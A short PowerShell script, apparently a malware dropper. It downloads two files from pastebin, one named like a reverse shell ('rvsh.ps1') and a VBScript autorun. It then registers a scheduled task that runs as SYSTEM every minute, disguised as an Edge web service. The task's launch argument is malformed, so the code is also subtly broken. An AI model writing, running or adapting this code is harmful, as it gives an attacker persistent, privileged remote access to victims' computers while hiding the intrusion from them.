$ruta = "$env:TEMP\edge-data"
mkdir $ruta -Force

Invoke-WebRequest -Uri "https://pastebin.com/raw/EgMY4QiS" -OutFile "$ruta\rvsh.ps1"
Invoke-WebRequest -Uri "https://pastebin.com/raw/qwGAyS8a" -OutFile "$ruta\autorun.vbs"

$action = New-ScheduledTaskAction -Execute 'PowerShell.exe' -Argument ".\$ruta\autorun.vbs"
$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1) -RepetitionInterval (New-TimeSpan -Minutes 1)
$principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType S4U
Register-ScheduledTask -TaskName 'edge-data' -Action $action -Trigger $trigger -Principal $principal -Description 'Web service Edge' -Force
